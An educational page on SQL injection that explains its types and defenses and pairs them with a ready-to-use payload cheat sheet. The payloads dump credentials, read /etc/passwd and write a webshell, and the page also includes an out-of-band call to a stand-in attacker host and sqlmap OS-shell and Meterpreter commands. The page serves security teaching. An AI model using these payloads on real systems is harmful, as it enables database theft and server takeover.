SQL Injection

SQL Injection (SQLi) is consistently ranked in the OWASP Top 10 and remains one of the most critical and widespread web vulnerabilities. It allows attackers to interfere with the queries an application makes to its database — reading, modifying, or deleting data they should never have access to.

What is SQL Injection?

SQL Injection occurs when user-supplied input is incorporated into a SQL query without proper sanitization. The attacker injects malicious SQL code that changes the logic of the query, causing the database to execute unintended commands.

Vulnerable code example (PHP):

php — Vulnerable Query
// VULNERABLE — user input directly in query
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);

// If user sends:  admin'--
// Query becomes:  SELECT * FROM users WHERE username = 'admin'--'
// The -- comments out the rest — password check bypassed!

Impact: Authentication bypass, full database dump, reading server files, writing webshells, and in some configs even OS command execution via stored procedures like xp_cmdshell (MSSQL).

Types of SQL Injection

SQLi is broadly categorized by how the attacker receives feedback from the database:

In-Band — Error Based

The database error message is returned directly in the HTTP response. Fastest to exploit — the error message leaks table names, column names, and data directly. Example: CONVERT(int, (SELECT TOP 1 name FROM sysobjects))

In-Band — Union Based

Uses the UNION SQL keyword to append a second SELECT query whose results are returned in the same HTTP response. Requires knowing the number and data types of columns. Most common CTF technique.

Blind — Boolean Based

No data returned in the response, but the application behaves differently based on TRUE/FALSE conditions. Attacker extracts data one bit at a time by asking yes/no questions: AND SUBSTRING(username,1,1)='a'

Blind — Time Based

No visible difference in the response at all. Instead, the attacker causes the server to sleep for a set time to confirm TRUE/FALSE: IF(1=1, SLEEP(5), 0) — if the response takes 5 seconds, the condition is true.

Out-of-Band (OOB)

Data is exfiltrated via a different channel — like DNS lookups or HTTP requests to an attacker-controlled server. Used when other techniques fail: LOAD_FILE('\\\\attacker.com\\share')

Second Order (Stored)

Malicious input is stored in the database first (seemingly safe), then executed later when another part of the application uses it in a query. Harder to detect than first-order injection.

# Get database version
' UNION SELECT NULL,@@version,NULL--

# Get current database name
' UNION SELECT NULL,database(),NULL--

# Get current user
' UNION SELECT NULL,user(),NULL--

# List all databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

# List tables in current database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

# List columns in a specific table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Dump usernames + passwords
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Read server files (requires FILE privilege)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--

# Write a webshell (requires write permissions)
' UNION SELECT NULL,'',NULL INTO OUTFILE '/var/www/html/shell.php'--

SQLMap — Automated Exploitation

SQLMap is the gold-standard tool for automated SQLi detection and exploitation. It handles all types, fingerprints the DB, and dumps data automatically.

bash — SQLMap Cheatsheet
# Basic scan on a GET parameter
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Specify parameter to test
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id

# Use session cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Set request from Burp file
sqlmap -r request.txt

# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Enumerate tables in specific database
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# Enumerate columns in a table
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --columns

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump

# Dump entire database
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# OS shell (if permissions allow)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Try to get a Meterpreter shell
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# Use level/risk for more aggressive testing
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3

# Use a tamper script to bypass WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between

Database Fingerprinting

Different databases have different syntax. Identify the backend DB to use correct payloads:

sql — DB Identification Payloads
# MySQL
SELECT @@version        -- returns version like 8.0.32-MySQL
SELECT @@datadir        -- data directory
SELECT USER()           -- current user
SELECT database()       -- current database

# MSSQL (Microsoft SQL Server)
SELECT @@version        -- Microsoft SQL Server ...
SELECT @@servername     -- server name
SELECT USER_NAME()      -- current user
SELECT DB_NAME()        -- current database
EXEC xp_cmdshell('whoami')  -- OS command (if enabled)

# PostgreSQL
SELECT version()        -- PostgreSQL 14.5...
SELECT current_user     -- current user
SELECT current_database()  -- current DB
COPY users TO '/tmp/out.txt'  -- write file

# Oracle
SELECT * FROM v$version   -- Oracle Database 19c...
SELECT user FROM dual       -- current user
SELECT global_name FROM global_name  -- DB name

# SQLite
SELECT sqlite_version()    -- 3.39.2
SELECT name FROM sqlite_master WHERE type='table'  -- list tables

Defenses & Mitigations

Prepared Statements

The gold standard. Parameterized queries ensure user input is always treated as data, never as SQL code. stmt.setString(1, input)

Input Validation

Whitelist allowed characters. Reject anything that doesn't match expected format — e.g., numeric IDs should only accept digits.

Least Privilege

The DB account the app uses should have only the permissions it needs — no DROP, no FILE, limited SELECT. Never run as root/sa.

WAF (Web App Firewall)

ModSecurity, Cloudflare WAF, or AWS WAF can block SQLi patterns. Not a replacement for code fixes but adds a critical detection layer.

Error Handling

Never expose DB error messages to users. Custom error pages prevent information leakage that aids exploitation.

Logging & Alerting

Log all database queries. Alert on anomalies — multiple errors, long queries, UNION keywords in production logs.

php — Secure Parameterized Query
// SECURE — using prepared statement (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();

// SECURE — using MySQLi prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

Always: Prepared statements first, WAF second, error suppression third. Defense in depth — use all three together.
